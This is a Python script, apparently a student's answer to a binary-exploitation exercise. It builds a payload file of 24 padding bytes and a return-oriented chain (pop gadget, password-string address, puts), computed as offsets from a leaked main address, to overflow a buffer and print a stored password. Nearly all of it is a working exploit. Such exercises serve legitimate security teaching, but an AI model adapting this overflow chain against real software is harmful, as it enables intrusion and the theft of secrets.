#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(f, v):
    assert isinstance(v, str)
    f.flush()
    f.write(v.encode("ascii"))
    f.flush()

def writeBytes(f, v):
    assert isinstance(v, bytes)
    f.flush()
    f.write(v)
    f.flush()

def writeLong(f, v):
    assert isinstance(v, int)
    f.flush()
    f.write(v.to_bytes(8, 'little'))
    f.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# TODO: Implement your solution here.

mainA = int(input(), 16) # main address

with open("t.bin", "wb") as f:
	writeStr(f, "a"*24)
	popA = mainA + 222 # pop adress
	f.write(popA.to_bytes(8, 'little'))
	pwdA = mainA + 3439 # password address
	f.write(pwdA.to_bytes(8, 'little'))
	putsA = mainA + 105 
	f.write(putsA.to_bytes(8, 'little'))

print("t.bin")